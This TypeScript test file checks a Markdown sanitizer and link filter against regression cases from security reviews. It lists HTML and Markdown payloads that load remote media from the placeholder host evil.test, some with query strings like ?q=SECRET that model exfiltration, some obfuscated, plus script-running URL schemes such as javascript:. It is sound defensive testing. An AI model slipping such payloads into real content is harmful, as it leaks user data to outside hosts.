import assert from 'node:assert/strict';
import { test } from 'node:test';
import { neutralizeRemoteMedia, openableHref } from '../src/safeMarkdown';

// A real tag (not one escaped as text) with a loading attribute, a live <input>, or a remote image.
const loads = (out: string) =>
  /<[a-z][^<>]*[\s/](?:style|background|src|srcset|poster)\s*=/i.test(out) || /<(?:input|img)/i.test(out) || /!\[[^\]]*(?:\[[^\]]*\][^\]]*)*\]\((?!attachments\/)/i.test(out);

// The cases from the 2026-09-15 review.
const unsafe = [
  '<span style=background:url(https://evil.test/?q=SECRET)>x</span>',
  '<span style="background:u\\72l(https://evil.test/esc)">x</span>',
  '![a [b] c](https://evil.test/nested.png)',
  '<input type="image" src="https://evil.test/input.png">',
  '<table background="https://evil.test/table.png"><tr><td>x</td></tr></table>',
  'Ref ![alt][r]\n\n[r]: https://evil.test/ref.png',
  // The cases from the 2026-10-05 audit: no space before an attribute, a closing run of another
  // length, an escaped backtick, a backtick fence with a backtick in its info string, a fence that
  // ends with its list item.
  '<div/style="background:url(https://evil.test/?q=SECRET)">x</div>',
  '<span title="a"style="background:url(//evil.test)">t</span>',
  '`![p](https://evil.test/?d=S)``',
  '\\`![p](https://evil.test/esc.png)`',
  '```x```\n\n![p](https://evil.test/fence.png)',
  '- item\n  ```\n  code\n  ```x\nafter ![p](https://evil.test/list.png)',
  // An address spelled with an entity or an escape, which Markdown decodes before loading it.
  '![x](&#104;ttps://evil.test/a.png)',
  '![x](https\\://evil.test/b.png)',
  '![x](&#x2F;&#x2F;evil.test/c.png)',
  // A tag's `>` hidden in a quoted attribute.
  '<a title=">" style="background:url(https://evil.test)">t</a>',
  // Dollar signs that are not math around a tag.
  'costs $5 <img src=https://evil.test/d.png> and $6',
];

for (const input of unsafe) {
  test(`remote media no longer loads: ${input.slice(0, 50).replace(/\n/g, " ")}`, () => {
    assert.equal(loads(neutralizeRemoteMedia(input)), false, neutralizeRemoteMedia(input));
  });
}

test('a remote image becomes a link', () => {
  assert.equal(neutralizeRemoteMedia('![a [b] c](https://evil.test/nested.png)'), '[a [b] c](https://evil.test/nested.png)');
});

test('embeds, local images and code are left alone', () => {
  const text = 'Embed ![[Figure 1.png]], local ![fig](attachments/fig.png), code `![x](https://a.test/b.png)`';
  assert.equal(neutralizeRemoteMedia(text), text);
});

test('links in replies open unless their scheme runs script or they do not parse', () => {
  for (const href of ['https://example.org/a', 'file:///private/tmp/A%20B.pdf', 'vscode://file/Users/x/a.tex:120', 'zotero://select/library/items/ABC', 'mailto:a@b.c']) {
    assert.equal(openableHref(href), true, href);
  }
  for (const href of ['javascript:alert(1)', ' JavaScript:alert(1)', 'data:text/html,<b>x</b>', 'vbscript:x', 'blob:https://a/b', 'not a url', '']) {
    assert.equal(openableHref(href), false, href);
  }
});

test('a fenced block and a code span still keep what they show', () => {
  const text = '```md\n![x](https://a.test/b.png)\n```\n\nand ``a ` ![x](https://a.test/c.png) b``';
  assert.equal(neutralizeRemoteMedia(text), text);
});

test('raw HTML shows as text, but for tags with no attributes, autolinks, and math', () => {
  assert.equal(
    neutralizeRemoteMedia('a<br>b <sup>2</sup> <span style="x">s</span> <https://a.org> and $0<x \\le 1$, $$a<b$$'),
    'a<br>b <sup>2</sup> &lt;span style="x">s</span> <https://a.org> and $0<x \\le 1$, $$a<b$$',
  );
});

test('an image shows only when it is plainly a file of the vault', () => {
  const kept = '![f](attachments/fig.png) ![[Fig.png]] ![a](<my fig.png> "t") ![b](fig%20one.png)';
  assert.equal(neutralizeRemoteMedia(kept), kept);
  assert.equal(neutralizeRemoteMedia('![a](/abs/fig.png) ![b](file:///x.png)'), '[a](/abs/fig.png) [b](file:///x.png)');
});
